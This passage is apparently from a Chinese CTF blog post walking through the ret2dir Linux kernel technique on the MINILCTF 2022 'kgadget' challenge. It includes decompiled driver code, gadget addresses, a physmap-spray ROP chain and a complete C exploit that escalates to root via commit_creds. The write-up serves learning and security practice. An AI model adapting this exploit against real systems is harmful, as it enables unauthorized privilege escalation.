+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">kgadget_ioctl</span><span class="params">(file *__file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> __int64 param)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> (__fastcall **v3)(<span class="type">void</span> *, _QWORD); <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">void</span> (__fastcall *v4)(<span class="type">void</span> *, _QWORD); <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> (__fastcall *v5)(<span class="type">void</span> *, _QWORD); <span class="comment">// rsi</span></span><br><span class="line"></span><br><span class="line">  _fentry__(__file, *(_QWORD *)&amp;cmd);</span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">114514</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *v3;</span><br><span class="line">    v5 = *v3;</span><br><span class="line">    printk(&amp;unk_370);</span><br><span class="line">    printk(&amp;unk_3A0);</span><br><span class="line">    qmemcpy(</span><br><span class="line">      (<span class="type">void</span> *)(((<span class="type">unsigned</span> __int64)&amp;STACK[<span class="number">0x1000</span>] &amp; <span class="number">0xFFFFFFFFFFFFF000L</span>L) - <span class="number">168</span>),</span><br><span class="line">      <span class="string">&quot;arttnba3arttnba3arttnba3arttnba3arttnba3arttnba3&quot;</span>,</span><br><span class="line">      <span class="number">48</span>);</span><br><span class="line">    *(_QWORD *)(((<span class="type">unsigned</span> __int64)&amp;STACK[<span class="number">0x1000</span>] &amp; <span class="number">0xFFFFFFFFFFFFF000L</span>L) - <span class="number">112</span>) = <span class="number">0x3361626E74747261L</span>L;</span><br><span class="line">    printk(&amp;unk_3F8);</span><br><span class="line">    v4(&amp;unk_3F8, v5);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_420);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>当传入的cmd参数为114514时，程序会调用<code>call [param]</code>，这个函数中的<code>qmemcpy</code>是被优化后的操作，实际汇编为</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text.unlikely:0000000000000160                               regs = rdx                              ; pt_regs *</span><br><span class="line">.text.unlikely:0000000000000160 48 BA 61 72 74 74 6E 62 61 33 mov     regs, &#x27;3abnttra&#x27;</span><br><span class="line">.text.unlikely:000000000000016A 48 89 90 58 FF FF FF          mov     [rax-0A8h], rdx</span><br><span class="line">.text.unlikely:0000000000000171 48 89 90 60 FF FF FF          mov     [rax-0A0h], rdx</span><br><span class="line">.text.unlikely:0000000000000178 48 89 90 68 FF FF FF          mov     [rax-98h], rdx</span><br><span class="line">.text.unlikely:000000000000017F 48 89 90 70 FF FF FF          mov     [rax-90h], rdx</span><br><span class="line">.text.unlikely:0000000000000186 48 89 90 78 FF FF FF          mov     [rax-88h], rdx</span><br><span class="line">.text.unlikely:000000000000018D 48 89 50 80                   mov     [rax-80h], rdx</span><br><span class="line">.text.unlikely:0000000000000191 48 89 50 90                   mov     [rax-70h], rdx</span><br></pre></td></tr></table></figure></div>
+
+<p>我们在调试之后可以发现这些操作实际上是将保存在内核栈里面的寄存器损坏了，但还保留了两个，即<code>r9  r8</code>的值，那它们有什么用呢，继续分析</p>
+<p>因为是<code>call [param]</code>，因此我们可以直接设置<code>param</code>为<code>direct mapping area</code>中的一个位置，但前提是我们要喷射很多内存，并在这些内存中填充上有用的gadget。在执行完一个gadget之后，必然会继续ret，这时我们就需要控制栈到dir位置了，<code>r8 r9</code>中未损坏的值就可以用来进行栈迁移。例如在<code>call [param]</code>后到param位置时栈的状态如下</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0xffffc90000257ed8</span> —▸ <span class="number">0xffffffffc000219f</span> ◂— xor eax, eax</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0xffffc90000257ee0</span> —▸ <span class="number">0xffffc90000257f58</span> ◂— <span class="number">0x3361626e74747261</span> (<span class="string">&#x27;arttnba3&#x27;</span>)</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0xffffc90000257ee8</span> ◂— <span class="number">0xf2debfc5f34a5a00</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0xffffc90000257ef0</span> —▸ <span class="number">0xffff888004226600</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│ rbp <span class="number">0xffffc90000257ef8</span> —▸ <span class="number">0xffffc90000257f30</span> —▸ <span class="number">0xffffc90000257f48</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0xffffc90000257f00</span> —▸ <span class="number">0xffffffff81319232</span> ◂— cmp eax, <span class="number">0xfffffdfd</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0xffffc90000257f08</span> —▸ <span class="number">0xffffc90000257f58</span> ◂— <span class="number">0x3361626e74747261</span> (<span class="string">&#x27;arttnba3&#x27;</span>)</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0xffffc90000257f10</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓        <span class="number">3</span> skipped</span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│     <span class="number">0xffffc90000257f30</span> —▸ <span class="number">0xffffc90000257f48</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│     <span class="number">0xffffc90000257f38</span> —▸ <span class="number">0xffffffff81bb9607</span> ◂— mov qword ptr [rbx + <span class="number">0x50</span>], rax</span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│     <span class="number">0xffffc90000257f40</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│     <span class="number">0xffffc90000257f48</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│     <span class="number">0xffffc90000257f50</span> —▸ <span class="number">0xffffffff81c0008c</span> ◂— mov rcx, qword ptr [rsp + <span class="number">0x58</span>]</span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│     <span class="number">0xffffc90000257f58</span> ◂— <span class="number">0x3361626e74747261</span> (<span class="string">&#x27;arttnba3&#x27;</span>)</span><br><span class="line">... ↓        <span class="number">5</span> skipped</span><br><span class="line"><span class="number">16</span>:<span class="number">00b</span>0│     <span class="number">0xffffc90000257f88</span> ◂— <span class="number">0x202</span></span><br><span class="line"><span class="number">17</span>:<span class="number">00b</span>8│     <span class="number">0xffffc90000257f90</span> ◂— <span class="number">0x3361626e74747261</span> (<span class="string">&#x27;arttnba3&#x27;</span>)</span><br><span class="line"><span class="number">18</span>:<span class="number">00</span>c0│     <span class="number">0xffffc90000257f98</span> ◂— <span class="number">0x99999999</span>						******r9******</span><br><span class="line"><span class="number">19</span>:<span class="number">00</span>c8│     <span class="number">0xffffc90000257fa0</span> ◂— <span class="number">0x88888888</span>						******r8******</span><br><span class="line"><span class="number">1</span>a:<span class="number">00</span>d0│     <span class="number">0xffffc90000257fa8</span> ◂— <span class="number">0xffffffffffffffda</span></span><br><span class="line"><span class="number">1b</span>:<span class="number">00</span>d8│     <span class="number">0xffffc90000257fb0</span> —▸ <span class="number">0x402c0a</span> ◂— mov eax, <span class="number">0</span></span><br><span class="line"><span class="number">1</span>c:<span class="number">00e0</span>│     <span class="number">0xffffc90000257fb8</span> —▸ <span class="number">0xffff888007000000</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">1</span>d:<span class="number">00e8</span>│     <span class="number">0xffffc90000257fc0</span> ◂— <span class="number">0x1bf52</span></span><br></pre></td></tr></table></figure></div>
+
+<p>我们可以找到如下gadget，称此gadget为<code>ADD_RSP_0xa0_POP_FOUR_REG_RET</code></p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ffffffff816fca4a:       <span class="number">48</span> <span class="number">81</span> c4 a0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    add    $<span class="number">0xa0</span>,%rsp</span><br><span class="line">ffffffff816fca51:       <span class="number">5b</span>                      pop    %rbx</span><br><span class="line">ffffffff816fca52:       <span class="number">41</span> <span class="number">5</span>c                   pop    %r12</span><br><span class="line">ffffffff816fca54:       <span class="number">41</span> <span class="number">5</span>d                   pop    %r13</span><br><span class="line">ffffffff816fca56:       <span class="number">5</span>d                      pop    %rbp</span><br><span class="line">ffffffff816fca57:       c3                      ret</span><br></pre></td></tr></table></figure></div>
+
+<p>那么我们只需要设置<code>r8=param    r9=pop_rsp</code>，（pop_rsp为<code>0xffffffff811483d0 : pop rsp ; ret</code>），这样就可以把栈迁移到<code>direct mapping area</code>来进行ROP了</p>
+<h3 id="ROP链构造"><a href="#ROP链构造" class="headerlink" title="ROP链构造"></a>ROP链构造</h3><p>我们应该让落在<code>ADD_RSP_0xa0_POP_FOUR_REG_RET</code>的概率尽可能大一点，因此我们可以尽可能多的写入<code>ADD_RSP_0xa0_POP_FOUR_REG_RET</code>的地址，同时能使其滑入提权的payload，例如这是一片页内存，按如下方式布置</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  0    -----------------------------------------------------------------</span><br><span class="line">      |                ADD_RSP_0xa0_POP_FOUR_REG_RET                   |</span><br><span class="line"> 0xe00 -----------------------------------------------------------------</span><br><span class="line">      |                         RET                                    |</span><br><span class="line"> 0xfa0 -----------------------------------------------------------------</span><br><span class="line">      |                   get_root_payload                             |</span><br><span class="line">0x1000 -----------------------------------------------------------------</span><br></pre></td></tr></table></figure></div>
+
+<p>这样当栈被迁移到<code>ADD_RSP_0xa0_POP_FOUR_REG_RET</code>时，就必定可以滑入<code>RET</code>，从而到达<code>get_root_payload</code></p>
+<p>构造如下</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">construct_chain</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(; i &lt; (page_size<span class="number">-0x200</span>)/<span class="number">8</span>; i++)</span><br><span class="line">                chain[i] = ADD_RSP_0xa0_POP_FOUR_REG_RET;</span><br><span class="line">        <span class="keyword">for</span>(; i &lt; (page_size<span class="number">-0x60</span>)/<span class="number">8</span>; i++)</span><br><span class="line">                chain[i] = RET;</span><br><span class="line">        chain[i++] = POP_RDI_RET;</span><br><span class="line">        chain[i++] = init_cred;</span><br><span class="line">        chain[i++] = commit_creds;</span><br><span class="line">        chain[i++] = swapgs_restore_regs_and_return_to_usermode + <span class="number">27</span>;</span><br><span class="line">        chain[i++] = <span class="number">0</span>;</span><br><span class="line">        chain[i++] = <span class="number">0</span>;</span><br><span class="line">        chain[i++] = (<span class="type">size_t</span>)get_root_shell;</span><br><span class="line">        chain[i++] = user_cs;</span><br><span class="line">        chain[i++] = user_rflags;</span><br><span class="line">        chain[i++] = user_sp;</span><br><span class="line">        chain[i++] = user_ss;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="mmap喷射内存"><a href="#mmap喷射内存" class="headerlink" title="mmap喷射内存"></a>mmap喷射内存</h3><p>喷射内存就是尽可能多的消耗内存空间，从而增大成功概率</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">spray_physmap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">size_t</span> <span class="built_in">map</span>[<span class="number">15000</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Spray physmap...\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">15000</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">map</span>[i] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">                <span class="built_in">memcpy</span>((<span class="type">void</span>*)<span class="built_in">map</span>[i], chain, page_size);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Spray physmap end.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;kernel_pwn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff8108c6f0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> init_cred 0xffffffff82a6b700</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_RSP_0x90_POP_FIVE_REG_RET 0xffffffff81004049</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RET 0xffffffff8100405a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RSP_RET 0xffffffff811483d0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_RSP_0xa0_POP_FOUR_REG_RET 0xffffffff816fca4a</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810c92e0</span>, swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00fb0</span>;</span><br><span class="line"><span class="type">size_t</span> chain[<span class="number">16000</span>];</span><br><span class="line"><span class="type">size_t</span> target, pop_rsp=POP_RSP_RET;</span><br><span class="line"><span class="type">size_t</span> page_size;</span><br><span class="line"><span class="type">size_t</span>  *physmap_spray_arr[<span class="number">16000</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">construct_chain</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(; i &lt; (page_size<span class="number">-0x200</span>)/<span class="number">8</span>; i++)</span><br><span class="line">		chain[i] = ADD_RSP_0xa0_POP_FOUR_REG_RET;</span><br><span class="line">	<span class="keyword">for</span>(; i &lt; (page_size<span class="number">-0x60</span>)/<span class="number">8</span>; i++)</span><br><span class="line">		chain[i] = RET;</span><br><span class="line">	chain[i++] = POP_RDI_RET;</span><br><span class="line">	chain[i++] = init_cred;</span><br><span class="line">	chain[i++] = commit_creds;</span><br><span class="line">	chain[i++] = swapgs_restore_regs_and_return_to_usermode + <span class="number">27</span>;</span><br><span class="line">	chain[i++] = <span class="number">0</span>;</span><br><span class="line">	chain[i++] = <span class="number">0</span>;</span><br><span class="line">	chain[i++] = (<span class="type">size_t</span>)get_root_shell;</span><br><span class="line">	chain[i++] = user_cs;</span><br><span class="line">	chain[i++] = user_rflags;</span><br><span class="line">	chain[i++] = user_sp;</span><br><span class="line">	chain[i++] = user_ss;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_physmap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">size_t</span> <span class="built_in">map</span>[<span class="number">15000</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Spray physmap...\033[0m\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">15000</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">map</span>[i] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="built_in">memcpy</span>((<span class="type">void</span>*)<span class="built_in">map</span>[i], chain, page_size);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Spray physmap end.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	save_status();</span><br><span class="line">	dev_fd = open(<span class="string">&quot;/dev/kgadget&quot;</span>, O_RDWR);</span><br><span class="line">	<span class="keyword">if</span>(dev_fd &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to open the /dev/kgadget file!\033[0m\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">	construct_chain();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Construct rop chain success!\033[0m\n&quot;</span>);</span><br><span class="line">	spray_physmap();</span><br><span class="line">        </span><br><span class="line">	target = <span class="number">0xffff888000000000</span> + <span class="number">0x7000000</span>;</span><br><span class="line">	__asm__(</span><br><span class="line">	<span class="string">&quot;mov r15, 0x15151515;&quot;</span></span><br><span class="line">	<span class="string">&quot;mov r14, 0x14141414;&quot;</span></span><br><span class="line">	<span class="string">&quot;mov r13, 0x13131313;&quot;</span></span><br><span class="line">	<span class="string">&quot;mov r12, 0x12121212;&quot;</span></span><br><span class="line">	<span class="string">&quot;mov rbp, 0xbcbcbcbc;&quot;</span></span><br><span class="line">	<span class="string">&quot;mov rbx, 0xbdbdbdbd;&quot;</span></span><br><span class="line">	<span class="string">&quot;mov r11, 0x11111111;&quot;</span></span><br><span class="line">	<span class="string">&quot;mov r10, 0x10101010;&quot;</span></span><br><span class="line">	<span class="string">&quot;mov r9,  pop_rsp;&quot;</span></span><br><span class="line">	<span class="string">&quot;mov r8,  target;&quot;</span></span><br><span class="line">	<span class="string">&quot;mov rax, 0x10;&quot;</span></span><br><span class="line">	<span class="string">&quot;mov rcx, 0xcccccccc;&quot;</span></span><br><span class="line">	<span class="string">&quot;mov rdx, target;&quot;</span></span><br><span class="line">	<span class="string">&quot;mov rsi, 0x1bf52;&quot;</span></span><br><span class="line">	<span class="string">&quot;mov rdi, dev_fd;&quot;</span></span><br><span class="line">	<span class="string">&quot;syscall&quot;</span></span><br><span class="line">			);	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> kernel入门(2)之ret2dir</li>
+        <li><strong>Author:</strong> Static</li>
+        <li><strong>Created at
+                :</strong> 2026-03-21 13:10:49</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-03-10 16:44:15
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://staticccccccc.github.io/2026/03/21/kernel pwn/kernel入门(2)之ret2dir/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2026/03/21/kernel%20pwn/Pawnyable(1)%20-%20Kernel%20ROP/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">Pawnable笔记（一）之 Kernel ROP</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2026/03/21/kernel%20pwn/kernel%E5%85%A5%E9%97%A8(1)%E4%B9%8Bcore/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">kernel入门(1)之core</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.js';
+
+      (function() {
+        const startPath = location.pathname;
+        const startTime = Date.now();
+        const retryDelay = 200;
+        const retryLimit = 5000;
+
+        const runWaline = () => {
+          if (location.pathname !== startPath) {
+            return;
+          }
+
+          const container = document.getElementById('waline');
+          if (!container) {
+            if (Date.now() - startTime < retryLimit) {
+              setTimeout(runWaline, retryDelay);
+            }
+            return;
+          }
+
+          if (window.redefineWalineInstance?.destroy) {
+            window.redefineWalineInstance.destroy();
+          }
+
+          container.innerHTML = '';
+          window.redefineWalineInstance = init({
+            el: '#waline',
+            serverURL: 'https://example.example.com',
+            path: location.pathname,
+            dark: 'body[class~="dark-mode"]',
+            reaction: false,
+            requiredMeta: ['nick', 'mail'],
+            emoji: [],
+                      lang: 'zh-CN',
+          recaptchaV3Key: 'wasd',
+          });
+        };
+
+        runWaline();
+      })();
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">kernel入门(2)之ret2dir</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="nav-text">基本原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MINILCTF-2022-kgadget"><span class="nav-text">MINILCTF 2022 - kgadget</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ROP%E9%93%BE%E6%9E%84%E9%80%A0"><span class="nav-text">ROP链构造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mmap%E5%96%B7%E5%B0%84%E5%86%85%E5%AD%98"><span class="nav-text">mmap喷射内存</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-text">exp</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Static</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        14 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
